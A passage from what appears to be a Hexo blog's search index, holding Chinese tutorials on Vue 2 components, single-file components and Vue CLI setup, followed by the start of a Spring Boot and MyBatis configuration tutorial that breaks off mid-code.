class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名字<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;组件中的this指的是：&#x27;</span>,<span class="built_in">this</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            school</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName01</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;Vue实例中的this指的是：&#x27;</span>,<span class="built_in">this</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="46-一个重要的内置关系"><a href="#46-一个重要的内置关系" class="headerlink" title="46.一个重要的内置关系"></a>46.一个重要的内置关系</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>一个重要的内置关系<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype；</span></span><br><span class="line"><span class="comment">        2.为什么要有这个关系:让组件实例对象VC可以访问到Vue原型上的属性、方法；</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">    Vue.prototype.x = 99</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showX&quot;</span>&gt;</span>点我提示x<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showX</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.x)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建一个vm实例对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            school</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(school.prototype.__proto__ === Vue.prototype);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 定义一个构造函数</span></span></span><br><span class="line">    /*function Demo(params) &#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.a = <span class="number">1</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.b = <span class="number">2</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建一个Demo实例对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> d = <span class="keyword">new</span> Demo()</span></span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Demo.prototype);<span class="comment">//显式原型属性</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(d.__proto__);<span class="comment">//隐式原型属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Demo.prototype === d.__proto__);</span></span><br><span class="line">     </span><br><span class="line"><span class="javascript">    <span class="comment">//程序员通过显式原型属性操作原型对象，追加一个x属性，值为99.</span></span></span><br><span class="line">    Demo.prototype.x = 99</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// console.log(&#x27;@&#x27;,d.__proto__.x);</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">&#x27;@&#x27;</span>,d);*/</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="47-单文件组件"><a href="#47-单文件组件" class="headerlink" title="47.单文件组件"></a>47.单文件组件</h2><h3 id="47-1-创建一个School组件"><a href="#47-1-创建一个School组件" class="headerlink" title="47.1 创建一个School组件"></a>47.1 创建一个School组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 组件的结构 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;schoolName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//组件交互相关的代码（数据、方法等等）</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//export default Vue.extend(&#123;&#125;)可以简写为：export default &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;School&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="comment">/* 组件的样式 */</span></span></span><br><span class="line">    .demo&#123;</span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: orange;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-2-创建一个Student组件"><a href="#47-2-创建一个Student组件" class="headerlink" title="47.2 创建一个Student组件"></a>47.2 创建一个Student组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 组件的结构 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：&#123;&#123;studentName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">//组件交互相关的代码（数据、方法等等）</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//export default Vue.extend(&#123;&#125;)可以简写为：export default &#123;&#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;Tom&#x27;</span>,</span></span><br><span class="line">                age:22</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-3-创建一个App组件"><a href="#47-3-创建一个App组件" class="headerlink" title="47.3 创建一个App组件"></a>47.3 创建一个App组件</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 必须有div根元素 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">School</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Student</span>&gt;</span><span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 引入组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> School  <span class="keyword">from</span> <span class="string">&#x27;./School.vue&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Student  <span class="keyword">from</span> <span class="string">&#x27;./Student.vue&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">        components:&#123;</span><br><span class="line">            School,</span><br><span class="line">            Student</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="47-4-创建一个main-js入口文件"><a href="#47-4-创建一个main-js入口文件" class="headerlink" title="47.4 创建一个main.js入口文件"></a>47.4 创建一个main.js入口文件</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">    template:<span class="string">&#x27;&lt;App&gt;&lt;/App&gt;&#x27;</span>,</span><br><span class="line">    components:&#123;App&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="47-5-创建一个容器"><a href="#47-5-创建一个容器" class="headerlink" title="47.5 创建一个容器"></a>47.5 创建一个容器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试一下单文件组件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 准备一个容器 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;App&gt;&lt;/App&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="48-创建Vue脚手架"><a href="#48-创建Vue脚手架" class="headerlink" title="48.创建Vue脚手架"></a>48.创建Vue脚手架</h2><h3 id="48-1-说明"><a href="#48-1-说明" class="headerlink" title="48.1 说明"></a>48.1 说明</h3><p>1.Vue脚手架是Vue官方提供的标准化开发工具（开发平台）。</p><p>2.最新版本是4.x。</p><p>3.文档：<a href="https://cli.vuejs.org/zh/。">https://cli.vuejs.org/zh/。</a></p><h3 id="48-2-具体步骤"><a href="#48-2-具体步骤" class="headerlink" title="48.2 具体步骤"></a>48.2 具体步骤</h3><p><strong>第一步（仅第一次执行）：</strong>全局安装@vue/cli。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure><p><strong>第二步：</strong><font color="red"><strong>切换到你要创建项目的目录</strong></font>，然后使用命令创建项目。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vue create xxxx</span><br></pre></td></tr></table></figure><p><strong>第三步：</strong>启动项目。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure><p><strong>备注：</strong></p><ol><li><p>如果出现下载缓慢请配置npm淘宝镜像：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></li><li><p>Vue 脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack相关配置，请执行：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vue inspect &gt; output.js</span><br></pre></td></tr></table></figure></li></ol><h2 id="49-Vue脚手架项目的学习"><a href="#49-Vue脚手架项目的学习" class="headerlink" title="49.Vue脚手架项目的学习"></a>49.Vue脚手架项目的学习</h2><div class="tip warning"><p>由于使用了Vue脚手架，不方便直接贴源码展示，请移至项目仓库查看！（可以clone源码运行，方便查看效果）</p></div><span class='p left red h4'>GitHub存储库地址：</span><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/QianChengGit/vue_test"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=QianChengGit&repo=vue_test&theme=vue&show_owner=true"/></a>]]></content>
      
      
      <categories>
          
          <category> Vue学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot整合MyBatis（注解方式）</title>
      <link href="2021/05/09/springboot%E6%95%B4%E5%90%88Mybatis%EF%BC%88%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%EF%BC%89/"/>
      <url>2021/05/09/springboot%E6%95%B4%E5%90%88Mybatis%EF%BC%88%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8F%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="springboot整合MyBatis（注解方式）"><a href="#springboot整合MyBatis（注解方式）" class="headerlink" title="springboot整合MyBatis（注解方式）"></a>springboot整合MyBatis（注解方式）</h1><hr><ul><li><p>在pom.xml文件中导入MyBatis所需依赖：</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jdbc的starter，如果使用mybatis-spring-boot-starter就不需要这个starter,因为mybatis的starter自带jdbc的starter --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- MyBatis的starter --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--引入mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- druid连接池依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- log4j日志依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在application.yaml文件中配置数据源和MyBatis：</p>  <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据源的配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line">    <span class="attr">minIdle:</span> <span class="number">5</span></span><br><span class="line">    <span class="attr">maxActive:</span> <span class="number">20</span></span><br><span class="line">    <span class="attr">maxWait:</span> <span class="number">60000</span></span><br><span class="line">    <span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line">    <span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line">    <span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">    <span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">poolPreparedStatements:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">filters:</span> <span class="string">stat,wall,log4j</span></span><br><span class="line">    <span class="attr">maxPoolPreparedStatementPerConnectionSize:</span> <span class="number">20</span></span><br><span class="line">    <span class="attr">useGlobalDataSourceStat:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">connectionProperties:</span> <span class="string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建DataSourceConfig配置类：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置第三方组件（Druid连接池的数据源配置）</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DruidDataSource <span class="title">dataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建User实体类（实体类的属性要与数据表中字段名相同，数据库表的内容就不贴出来了）：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> 